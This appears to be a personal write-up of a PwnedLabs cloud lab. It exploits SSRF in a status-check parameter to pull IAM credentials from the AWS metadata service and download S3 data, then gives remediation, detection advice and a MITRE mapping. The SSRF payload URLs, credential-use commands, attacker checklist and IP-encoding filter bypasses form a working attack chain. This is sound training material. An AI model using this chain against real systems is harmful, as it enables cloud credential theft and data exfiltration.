# Lab 07 — SSRF to Pwned
**Platform:** PwnedLabs | **Difficulty:** Beginner  
**Tags:** `AWS` `SSRF` `IMDS` `IMDSv1` `EC2` `IAM` `S3` `Web Security` `Cloud Pentesting`  
**Date:** May 2026  
**My GitHub:** [JashwanthMU](https://github.com/JashwanthMU)

---

## Before I Start — Why This Lab Matters to Me

Out of all the labs I've done so far, this one felt the most real. Not because it was the hardest technically — it actually wasn't. But because the exact attack chain in this lab is what caused the **Capital One breach in 2019** — one of the biggest cloud security incidents ever — where over 100 million people's data got exposed.

I knew about SSRF as a web vulnerability from a web security context. What I didn't fully understand was how a web vulnerability becomes a cloud credential theft. This lab connects those two worlds clearly and I think that's why PwnedLabs made it.

Also — this is the first lab where I used Burp Suite, which felt like levelling up.

---

## What Even is SSRF?

SSRF stands for **Server-Side Request Forgery**.

The short version: some web applications let you give them a URL or hostname, and the server goes and fetches that URL on your behalf. The vulnerability happens when the server doesn't check what URL you're giving it — so you can point it at internal resources the server has access to but you normally don't.

Normal user flow:
```
User gives URL → Server fetches it → Returns response
```

SSRF attack flow:
```
Attacker gives internal URL → Server fetches internal resource → Returns internal data to attacker
```

In a cloud context this gets really dangerous because every EC2 instance in AWS has something called the **Instance Metadata Service (IMDS)** — a special internal endpoint at IP `169.254.169.254` that only the EC2 instance itself can reach. It contains information about the instance including temporary IAM credentials.

If you can make a server fetch from `169.254.169.254` via SSRF — you get those credentials. And that's exactly what this lab is about.

---

## The Scenario

Rumors on underground forums say Huge Logistics (the same fictional company from previous labs) might have been breached. My team is asked to investigate their website and check if the rumor is true.

**Given:** Target domain `app.huge-logistics.com` and an IP address to add to `/etc/hosts`

---

## What I Did — Step by Step

### Step 1 — Setup

Added the lab IP and domain to `/etc/hosts` so my browser resolves it correctly:

```bash
sudo nano /etc/hosts
# Added: [LAB_IP]  app.huge-logistics.com
```

Then browsed to `http://app.huge-logistics.com` to see what we're working with.

---

### Step 2 — Recon on the Website

Explored the site. It's a basic logistics company website — home page, some info pages. Most of it was not interesting.

Two things caught my attention:

**Thing 1 — Page source had an S3 bucket reference:**
```html
<img src="https://huge-logistics-storage.s3.amazonaws.com/images/logo.png">
```

So there's an S3 bucket called `huge-logistics-storage`. Filed that away for later.

**Thing 2 — A "Status Check" feature:**

There was a page that checked the status of something and it had a URL that looked like:
```
http://app.huge-logistics.com/status/status.php?name=hugelogisticsstatus.pwn
```

That `name` parameter is passing a hostname/URL to the server and the server is fetching it. This is the classic SSRF pattern — a parameter that controls what URL the server requests.

---

### Step 3 — Testing for SSRF

This is where Burp Suite came in. I intercepted the status check request and sent it to Repeater so I could modify the `name` parameter freely.

First test — replaced the `name` value with the AWS IMDS IP:

```
name=169.254.169.254
```

Full request:
```
GET /status/status.php?name=169.254.169.254 HTTP/1.1
Host: app.huge-logistics.com
```

**Response:** The server returned what looked like folder names from the metadata service:

```
latest
1.0
...
```

That confirmed it. The server fetched `169.254.169.254` on my behalf and returned the response. **SSRF confirmed.** The server is running on an EC2 instance and the metadata service is wide open.

> The IP `169.254.169.254` is what's called a link-local address. It's not routable on the internet — you can only reach it from within the same machine or local network segment. From an EC2 instance, it's always available. From the outside internet, it's completely unreachable. That's what makes SSRF the only way to get to it from outside.

---

### Step 4 — Digging Into the Metadata Service

Now that SSRF worked, I followed the IMDS path structure to get to the good stuff.

First, find what IAM role is attached to this EC2 instance:

```
name=169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Response:** `MetaPwnedS3Access`

That's the IAM role name. Now get the actual credentials for that role:

```
name=169.254.169.254/latest/meta-data/iam/security-credentials/MetaPwnedS3Access
```

**Response:**
```json
{
  "Code": "Success",
  "LastUpdated": "2023-xx-xxTxx:xx:xxZ",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2023-xx-xxTxx:xx:xxZ"
}
```

I now had temporary AWS credentials — Access Key ID, Secret Access Key, and a Session Token — for the `MetaPwnedS3Access` role. All from a URL manipulation in a browser.

> This only worked because the EC2 instance was running **IMDSv1** — the older version of the metadata service that has no authentication. You just send a GET request and it hands you credentials. IMDSv2 (the newer, secure version) requires a special session token that you get via a PUT request with specific headers — something SSRF attacks can't easily replicate because most SSRF vulnerabilities only allow GET requests.

---

### Step 5 — Using the Stolen Credentials

Configured AWS CLI with the stolen credentials. Because there's a session token (this is a temporary credential, not a permanent one), I had to set it manually:

```bash
aws configure --profile ssrf
# AWS Access Key ID: ASIA...
# AWS Secret Access Key: ...
# Default region: us-east-1

# Session token has to be set separately
aws configure set aws_session_token "..." --profile ssrf
```

Verify who I am now:

```bash
aws sts get-caller-identity --profile ssrf
```

**Response:**
```json
{
  "UserId": "AROA...",
  "Account": "...",
  "Arn": "arn:aws:sts::...:assumed-role/MetaPwnedS3Access/..."
}
```

I'm now authenticated as the `MetaPwnedS3Access` role. The SSRF turned into full AWS access.

---

### Step 6 — Accessing the S3 Bucket

Earlier I spotted `huge-logistics-storage` in the page source. Let's see what's in it now that I have valid credentials:

```bash
aws s3 ls s3://huge-logistics-storage --profile ssrf
```

```
PRE backup/
PRE images/
```

```bash
aws s3 ls s3://huge-logistics-storage/backup/ --profile ssrf
```

```
2023-xx-xx  cc-export2.txt
2023-xx-xx  flag.txt
```

Two files in the backup folder. Downloaded both:

```bash
aws s3 cp s3://huge-logistics-storage/backup/cc-export2.txt . --profile ssrf
aws s3 cp s3://huge-logistics-storage/backup/flag.txt . --profile ssrf
```

**cc-export2.txt** — contained customer credit card data. Actual PII. This is what the "breach" was about.

**flag.txt** — contained the lab flag. 

Lab complete.

---

## The Full Attack Chain (What Just Happened)

Let me write out the complete chain because I think seeing it all together is important:

```
[Website has status check feature]
        ↓
[Status check passes user input directly to server-side HTTP request]
        ↓
[SSRF: attacker substitutes AWS IMDS IP 169.254.169.254]
        ↓
[EC2 instance fetches from its own metadata service]
        ↓
[IMDSv1: no auth required, credentials returned directly]
        ↓
[Attacker gets temporary IAM credentials for MetaPwnedS3Access role]
        ↓
[Role has S3 access → attacker lists and downloads bucket contents]
        ↓
[Credit card data and flag exfiltrated] 
```

Five steps. No password cracking. No exploit code. Just a bad URL parameter and an unprotected metadata service.

---

## The Thing That Hit Me

When I finished this lab I went back and read about the Capital One breach properly. The attack there was almost identical to what I just did:

- Capital One ran a web application firewall (WAF) on EC2
- The WAF had an SSRF vulnerability in how it processed requests
- The attacker used SSRF to hit `169.254.169.254` and get IAM role credentials
- Those credentials had way too much S3 access
- Over 100 million records were downloaded

The only real difference is scale. The technique is the same.

What's scary is how simple it is. This isn't some sophisticated nation-state attack with custom malware. It's a URL substitution in a browser, followed by a few AWS CLI commands. The damage potential is enormous relative to how simple the execution is.

That's why cloud security matters so much more now than traditional web security alone. A regular SSRF in a normal web app might let you scan internal IPs. An SSRF in a cloud environment can hand you the keys to an entire AWS account.

---

## Why IMDSv1 is the Problem

This whole attack only works because the EC2 instance is using **IMDSv1**.

The difference between v1 and v2:

**IMDSv1:**
```bash
# Anyone can just GET credentials, no auth needed
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
# → Returns credentials immediately
```

**IMDSv2:**
```bash
# Step 1: Must do a PUT request first to get a session token
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token in all subsequent requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
```

SSRF attacks typically can only make GET requests. IMDSv2's required PUT step for getting the token makes it much harder to exploit via SSRF — most SSRF vulnerabilities can't inject the custom headers needed.

AWS changed the default to IMDSv2 for new instances in late 2023 (after this lab was made). But a massive number of older EC2 instances are still running IMDSv1. One of the first things any cloud security team should audit is which instances are still on v1.

---

## Connecting This to Previous Labs

This lab directly connects to things I already learned:

| Previous Lab | Connection |
|---|---|
| Lab 03 — IAM Enumeration | The role `MetaPwnedS3Access` follows the same pattern — a role with S3 access that shouldn't be reachable from outside |
| Lab 05 — Amazon Detective | The GuardDuty finding `InstanceCredentialExfiltration.OutsideAWS` is EXACTLY what would fire here — credentials used from an external IP |
| Lab 06 — Security Hub | `EC2.8 — EC2 instances should use IMDSv2` is a real Security Hub finding. If that was enabled and being reviewed, this attack doesn't work |
| Wiz ExfilCola CTF | Challenge 3 in the CTF involved Lambda credential theft. This lab is the EC2 equivalent of the same concept |

The pattern I keep seeing: every attack chain I study traces back to two things — too much IAM permission + missing basic controls. If `MetaPwnedS3Access` only had access to specific objects (not the entire backup folder), the damage is limited even if the SSRF works.

---

## Remediation — How to Fix This

### Fix 1 — Enforce IMDSv2 on all EC2 instances (most important)

```bash
# Fix existing instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-0abc123 \
  --http-tokens required \
  --http-put-response-hop-limit 1

# Set as default for ALL new instances in the account
aws ec2 modify-instance-metadata-defaults \
  --http-tokens required \
  --http-put-response-hop-limit 1
```

> Setting `http-put-response-hop-limit` to 1 means the token can only travel one network hop — so even if SSRF gets the token somehow, it can't be relayed further.

### Fix 2 — Find all instances still using IMDSv1

```bash
# Audit every EC2 instance — look for "optional" (means v1 is allowed)
aws ec2 describe-instances \
  --query "Reservations[*].Instances[*].{ID:InstanceId, IMDS:MetadataOptions.HttpTokens}" \
  --output table
# Anything showing "optional" needs to be fixed
```

### Fix 3 — Fix the SSRF vulnerability in the application

The root cause is that `status.php` passes the `name` parameter directly to an HTTP request without validation. Fix:

```php
// BAD — what the vulnerable code does:
$url = $_GET['name'];
$response = file_get_contents($url);  // fetches ANY URL including 169.254.169.254

// GOOD — what it should do:
$allowed_hosts = ['hugelogisticsstatus.pwn', 'status.internal.hugel.com'];
$name = $_GET['name'];
if (!in_array($name, $allowed_hosts)) {
    die("Invalid host");
}
// Only then proceed
```

Also block `169.254.169.254` at the WAF level as a defence-in-depth measure.

### Fix 4 — Least privilege on the IAM role

```json
// CURRENT (too broad — access to entire bucket)
{
  "Effect": "Allow",
  "Action": "s3:*",
  "Resource": "arn:aws:s3:::huge-logistics-storage/*"
}

// BETTER — only allow access to specific folders the app actually needs
{
  "Effect": "Allow",
  "Action": ["s3:GetObject"],
  "Resource": "arn:aws:s3:::huge-logistics-storage/images/*"
}
// Application doesn't need backup/ at all — remove that access entirely
```

### Fix 5 — Block IMDS access entirely if the application doesn't need it

```bash
# If the application on this EC2 instance doesn't actually use IAM role credentials
# just disable the metadata service completely
aws ec2 modify-instance-metadata-options \
  --instance-id i-0abc123 \
  --http-endpoint disabled
```

---

## Real-World Playbook — If You Find SSRF in a Cloud Environment

This is different from a normal web app SSRF. When you find SSRF in an AWS environment, the checklist expands significantly.

### As a Pentester / Red Teamer

```
1. Confirm SSRF works with a simple internal IP like 127.0.0.1 or 169.254.169.254
2. Check if IMDS is reachable: 169.254.169.254/latest/meta-data/
3. Get role name: 169.254.169.254/latest/meta-data/iam/security-credentials/
4. Get credentials: 169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]
5. Configure AWS CLI with stolen credentials (including session token)
6. Run get-caller-identity to confirm access
7. Enumerate what the role can do: list S3 buckets, check IAM permissions
8. Document full blast radius — what data is accessible?
9. In the report: flag IMDSv1 + SSRF as critical, show the full chain
```

### As a Defender / SOC Analyst

```
Detection signals:
- GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS
  → Role credentials used from external IP that isn't an AWS IP range
- CloudTrail: GetObject calls from assumed role at unusual volume or time
- WAF logs: requests to status.php with 169.254.169.254 in the name parameter

Response:
1. Rotate the IAM role immediately (detach and recreate)
2. Check CloudTrail for all API calls made with those credentials
3. Determine what data was accessed from S3
4. Fix the SSRF in code + WAF
5. Enforce IMDSv2 on the affected instance AND across all instances
6. If PII/PCI data was accessed → notify legal team (GDPR 72h window, PCI requirements)
```

---

## What I Still Want to Learn From This

- **IMDSv2 bypass techniques** — I read that in some edge cases SSRF can still work against IMDSv2 if the hop limit is set wrong or headers can be injected. Want to understand the exact conditions.
- **Container metadata endpoints** — ECS containers have a similar metadata endpoint at a different IP. Is SSRF in a containerised app the same threat?
- **SSRF filter bypass** — some apps try to block `169.254.169.254` but attackers use alternative encodings like `http://169.254.169.254` → `http://0xa9fea9fe` or `http://2852039166` (decimal encoding). Want to understand this more.
- **AWS WAF rules** — how to write a WAF rule that specifically blocks IMDS IP access attempts

---

## MITRE ATT&CK Mapping

| Technique | MITRE ID |
|-----------|----------|
| SSRF exploiting web application input | T1190 — Exploit Public-Facing Application |
| EC2 Instance Metadata Service credential theft | T1552.005 — Unsecured Credentials: Cloud Instance Metadata API |
| Using stolen IAM credentials | T1078.004 — Valid Accounts: Cloud Accounts |
| S3 data exfiltration | T1530 — Data from Cloud Storage |

---

## References

- [AWS IMDS Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [AWS IMDSv2 Migration Guide](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [OWASP SSRF Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Capital One Breach — Wikipedia](https://en.wikipedia.org/wiki/2019_Capital_One_data_breach)
- [MITRE ATT&CK — Cloud Instance Metadata API (T1552.005)](https://attack.mitre.org/techniques/T1552/005/)
- [PwnedLabs — SSRF to Pwned](https://pwnedlabs.io/labs/ssrf-to-pwned)

---

